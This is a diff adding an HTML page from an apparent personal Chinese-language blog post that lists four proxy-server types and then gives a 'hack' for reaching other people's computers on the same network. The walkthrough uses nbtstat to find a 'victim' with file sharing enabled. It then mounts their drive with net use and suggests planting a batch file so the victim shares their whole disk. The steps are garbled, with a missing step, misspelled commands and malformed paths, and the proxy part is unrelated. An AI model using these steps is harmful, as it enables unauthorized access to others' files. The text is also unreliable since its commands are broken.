@@ -1,0 +1,272 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>设置服务器代理 | josyaaa</title>
+  <meta name="author" content="josyaaa">
+  
+  <meta name="description" content="1. 透明代理服务器这种类型的代理服务器将自己标识为代理服务器，并通过 http 标头使原始 IP 地址可用。这些通常用于加速网页浏览，因为它们具有非常好的缓存网站的能力。但他们不会隐藏其用户的 IP。它被广泛称为透明代理，因为它会将您的真实 IP 地址暴露给网络。这种类型的代理服务器不会隐藏您的 ">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="设置服务器代理"/>
+  <meta property="og:site_name" content="josyaaa"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/josyaaa/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/josyaaa/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/josyaaa/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/josyaaa/">josyaaa</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/josyaaa/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/josyaaa/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/josyaaa/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/josyaaa/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 设置服务器代理</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="1-透明代理服务器"><a href="#1-透明代理服务器" class="headerlink" title="1. 透明代理服务器"></a>1. 透明代理服务器</h1><p>这种类型的代理服务器将自己标识为代理服务器，并通过 http 标头使原始 IP 地址可用。这些通常用于加速网页浏览，因为它们具有非常好的缓存网站的能力。但他们不会隐藏其用户的 IP。它被广泛称为透明代理，因为它会将您的真实 IP 地址暴露给网络。这种类型的代理服务器不会隐藏您的 IP 地址。</p>
+<h1 id="2-匿名代理服务器"><a href="#2-匿名代理服务器" class="headerlink" title="2.匿名代理服务器"></a>2.匿名代理服务器</h1><p>这种类型的代理服务器将自己标识为代理服务器，但不会使原始IP地址可用。这种类型的代理服务器是可检测的，但为大多数用户提供了合理的匿名性。这种类型的代理服务器将隐藏您的 IP 地址。</p>
+<h1 id="3-扭曲代理服务器"><a href="#3-扭曲代理服务器" class="headerlink" title="3. 扭曲代理服务器"></a>3. 扭曲代理服务器</h1><p>这种类型的代理服务器将自己标识为代理服务器，但通过 http 标头提供了不正确的原始 IP 地址。这种类型的代理服务器将隐藏您的 IP 地址。</p>
+<h1 id="4-高匿名代理服务器（精英代理）"><a href="#4-高匿名代理服务器（精英代理）" class="headerlink" title="4. 高匿名代理服务器（精英代理）"></a>4. 高匿名代理服务器（精英代理）</h1><p>这种类型的代理服务器不将自己标识为代理服务器，也不提供原始 IP 地址。这种类型的代理服务器会隐藏您的 IP 地址。所以这是屏蔽您的 IP 的最佳方式。</p>
+<p><strong>High Anonymity Proxy or Elite Proxy is the best to hide your IP</strong></p>
+<h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><ul>
+<li>第1步：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">现在转到Star并单击Run，然后键入“CMD”并按Enter。</span><br><span class="line">命令提示符将打开。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第 2 步：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;输入 cmd 为“ nbtstat -a IPaddressOfVictim”  ，然后按 Enter。</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">例如：</span><br><span class="line">             nbstat -a 223.222.222.222</span><br><span class="line">---------------------------------------             </span><br><span class="line">如果您在 NetBIOS 远程机器名称表中看到这个</span><br><span class="line">---------------------------------------</span><br><span class="line">\名称 类型 状态 —————————————————————</span><br><span class="line">user&lt;00&gt; UNIQUE 注册</span><br><span class="line">工作组 &lt;00&gt; GROUP 注册</span><br><span class="line">用户 &lt;03&gt; UNIQUE 注册</span><br><span class="line">用户 &lt;20&gt; UNIQUE 注册</span><br><span class="line">----------------------------------</span><br><span class="line">MAC地址= xx-xx-xx-xx-xx-xx</span><br><span class="line">—————————————————————</span><br><span class="line">如果你没有得到数字&lt;20&gt;。</span><br><span class="line">受害者禁用了文件和打印机共享，找到另一个受害者。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第 4 步：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">现在键入“net use x:\IPaddressOfVictimCDISK”，然后按 Enter&gt;</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">用 vitim 的 IP 地址代替“IPaddressOfVictim.</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">你可以用任何字母代替“x”。</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">例如：</span><br><span class="line">             net use x:\223.222.222.222CDISK</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第 5 步：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">现在打开 Windows 资源管理器或双击</span><br><span class="line">桌面上的“我的电脑”图标，您将看到一个新的网络驱动器</span><br><span class="line">---------------------------------------------</span><br><span class="line">现在打开 Windows 资源管理器或双击</span><br><span class="line">桌面上的“我的电脑”图标，您将看到一个新的网络驱动器 X:</span><br><span class="line">---------------------------------------------</span><br><span class="line">仅当您的网络上有某人的 ip 时，此 hack 才会起作用。如果您要“破解”的人的 ip 不在您的网络上，它将无法正常工作。</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">如果您只能访问您的目标共享文件夹，则在他们的共享文件夹中放置一个批处理文件，如果他们打开它，使用命令 C=C，它将共享他们的硬盘。</span><br></pre></td></tr></table></figure>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/josyaaa/2022/05/12/principles and practice/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/josyaaa/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/josyaaa/2022/05/12/fault-tolerance/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-05-12 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2022 josyaaa
+  
+      when meets RED to BLUE ...<a href="https://josyaaa.github.io/" target="_blank">josyaaa's blog</a>,<a href="https://github.com/josyaaa?tab=repositories">josyaaa's github</a><a href="http://getbootstrap.com/" target="_blank"></a><a href="http://getbootstrap.com/" target="_blank"></a>.
+     <br> SCDAD/BIG DATA/MALWARE <a href="http://github.com/wzpan/hexo-theme-freemind/"></a> most good at leading tech
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/josyaaa/js/jquery.imagesloaded.min.js"></script>
+<script src="/josyaaa/js/gallery.js"></script>
+<script src="/josyaaa/js/bootstrap.min.js"></script>
+<script src="/josyaaa/js/main.js"></script>
+<script src="/josyaaa/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/josyaaa/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/josyaaa/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/josyaaa/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
